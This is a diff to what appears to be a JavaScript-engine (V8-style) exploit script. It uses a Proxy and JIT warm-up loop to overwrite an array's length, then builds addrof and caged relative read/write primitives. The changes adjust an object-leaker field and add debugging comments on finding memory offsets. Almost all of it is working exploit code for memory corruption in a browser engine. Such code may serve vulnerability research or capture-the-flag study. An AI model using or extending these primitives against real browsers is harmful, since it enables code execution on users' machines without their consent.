@@ -65,8 +65,10 @@ let p = new Proxy(Object, {
             uint64_aarw = new BigUint64Array(4);
             obj_leaker = {
                 a: float_rel,
-                b: float_carw,
+                b: a,
             };
+            // %DebugPrint(float_rel)
+            // readline()
         }
         return Object.prototype;
     }
@@ -87,7 +89,7 @@ for (let i = 0; i <= threshold; i++) {
     f(a, p)
 }
 
-console.assert(float_rel.length == (0x10000 >> 1))
+console.assert(float_rel.length == (0x10000 >> 1)) // 0x10000 comes from 0x1337133700010000
 
 print("[+] Overwritten float_rel length =", hex(float_rel.length))
 
@@ -149,7 +151,11 @@ function addrof(o) {
     return addr;
 }
 
-// To help in finding offset for rel_read and rel_write
+
+/*
+ * Helper in finding objleaker_offset using output of %DebugPrint(float_rel) and %DebugPrint(a) while in interactive mode
+ * Helper in finding float_carw_elements_offset
+ */
 // for (let j = 0x0; j < 0x80; j+=1) {
 //     print(j, " ", hex(caged_relative_read4(j)))
 // }
